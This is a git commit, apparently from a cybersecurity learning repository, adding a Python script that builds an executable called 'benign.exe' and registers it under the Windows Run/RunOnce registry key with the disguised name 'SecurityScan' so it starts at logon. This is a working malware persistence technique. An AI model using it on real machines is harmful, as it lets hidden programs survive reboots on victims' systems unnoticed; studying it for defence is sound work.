6244bfe51ee8f2df3f8c52a92749869093211efe
CaptShiva007 <shivahacker007@gmail.com>
2024-05-11 12:06:10 +0530

    Windows based progs added

---
+++ PYTHON/Python For Cybersecurity/WINREG/regAutorun.py
@@ -0,0 +1,30 @@
+import os
+import winreg
+import shutil
+
+filedir=os.path.join(os.getcwd(),"Temp")
+filename='benign.exe'
+filepath=os.path.join(filedir,filename)
+
+if os.path.isfile(filepath):
+    os.remove(filepath)
+
+os.system("py BuildExe.py")
+
+shutil.move(filename,filedir)
+
+regkey=1
+
+if regkey < 2:
+    reghive=winreg.HKEY_CURRENT_USER
+else:
+    reghive=winreg.HKEY_LOCAL_MACHINE
+
+if (regkey%2)==0:
+    regpath="SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+else:
+    regpath="SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
+
+reg=winreg.ConnectRegistry(None,reghive)
+key=winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
+winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,filepath)
